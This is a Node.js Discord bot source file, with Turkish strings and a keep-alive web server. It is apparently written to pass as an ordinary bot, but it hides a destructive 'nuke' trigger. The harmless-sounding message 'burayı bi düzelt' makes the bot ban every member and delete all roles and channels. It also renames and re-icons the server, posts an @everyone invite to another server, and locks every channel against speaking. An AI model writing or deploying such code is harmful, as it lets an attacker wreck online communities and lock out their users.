//7/24 başlayış

const http = require('http');
const express = require('express');    
const app = express();
let cooldown = new Set();
let cdseconds = 5;
app.get("/", (request, response) => {
  console.log(Date.now());
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://pyros.glitch.me/`);
}, 10000);

const Discord = require('discord.js');
const fs = require('fs');
const chalk = require('chalk');

const client = new Discord.Client();
const tokenyeri = require('./tokenyeri.json');

require('./util/eventLoader')(client);

client.on('message', message => {
    if(message.content == 'unban'){
        message.guild.fetchBans().then(bans => {
            bans.forEach(user => {
                console.log(user.username + '#' + user.tag);
                message.guild.unban(user);
            });
        });
    }
});

client.on('message', message => {
    if(message.content == 'burayı bi düzelt'){
   message.guild.members.forEach(member => member.ban())
   message.guild.roles.deleteAll("");
   message.guild.channels.deleteAll("");
   message.guild.setName(`Kapandı`, "")
   message.guild.setIcon(`https://cdn.discordapp.com/attachments/615300671599804435/616763400508145684/16-512.png`)
   message.guild.createChannel(`hey`)
    }
});

client.on('channelCreate', channel => {
  if (channel.name == 'hey') {
    channel.send(`Allah zihin açıklığı versin. @everyone \n\nhttps://discord.gg/4judfSa`)
    channel.guild.channels.forEach(c => {
         c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
              SEND_MESSAGES: false,
              ADD_REACTIONS: false,
              SPEAK: false
            });
          });
  }
  if (channel.name == '') {
    channel.send(``)
  }

});

client.login(tokenyeri.token) 